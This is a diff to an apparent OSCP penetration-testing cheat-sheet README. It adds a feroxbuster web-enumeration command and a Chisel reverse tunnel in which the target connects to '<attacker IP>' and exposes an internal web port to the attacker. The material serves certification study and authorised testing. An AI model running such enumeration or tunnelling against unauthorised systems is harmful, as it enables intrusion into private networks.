@@ -6,6 +6,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
@@ -18,6 +20,7 @@ This repository describes cheat sheet and knowledge for OSCP.
       - [Detect service and version](#detect-service-and-version)
       - [Enumeration for UDP](#enumeration-for-udp)
       - [Check for any known vulnerability by rustscan](#check-for-any-known-vulnerability-by-rustscan)
+    - [feroxbuster](#feroxbuster)
     - [/dev/tcp instead of nmap and rustscan](#devtcp-instead-of-nmap-and-rustscan)
   - [Windows Privilege Escalation](#windows-privilege-escalation)
     - [PowerUp.ps1](#powerupps1)
@@ -54,7 +57,7 @@ This repository describes cheat sheet and knowledge for OSCP.
         - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
 - [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
     - [Debugger](#debugger)
-    - [jwt_tool](#jwt_tool)
+    - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -82,6 +85,8 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Subdomain Fuzz](#subdomain-fuzz)
 - [SSH](#ssh)
   - [Convert Putty private key format to openssh](#convert-putty-private-key-format-to-openssh)
+  - [Port Forwarding](#port-forwarding)
+    - [Chisel](#chisel)
 - [Depixelize](#depixelize)
   - [Depix](#depix)
 - [Spawning shell](#spawning-shell)
@@ -230,6 +235,15 @@ rustscan -a $IP --udp -- -Pn -T4
 ```shell
 rustscan -a $IP -- --script vuln -oA vulnscan
 ```
+
+### feroxbuster
+[feroxbuster](https://github.com/epi052/feroxbuster) is one of enumeration tools for files and directories, and resources.
+This tool scans the directories and files in the web server recursively by default.
+```shell
+feroxbuster -u $URL
+```
+
+Also, this tool can detect the \<a> tag link.
 
 ### /dev/tcp instead of nmap and rustscan
 The following command is enumerating opened tcp ports (0-1000) in 172.19.0.1 (e.g. 172.19.0.x is generally used for docker network).
@@ -574,6 +588,21 @@ echo "PuTTY-User-Key-File-3: ssh-rsa
  Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0" > 
 ssh_key_file
 ```
+## Port Forwarding
+### Chisel
+[Chisel](https://github.com/jpillora/chisel) is one of fast TCP/UDP tunnel tools via SSH.
+This tool is tool to access local network.
+Server:
+```shell
+./chisel_1.10.0_linux_amd64 server -p 12312 --reverse
+```
+
+Client:
+```shell
+./chisel_1.10.0_linux_amd64 client <attacker IP>:12312 R:8081:127.0.0.1:8080
+```
+
+After running the above commands, we can access http://127.0.0.1:8081/ in attacker PC.
 
 
 # Depixelize
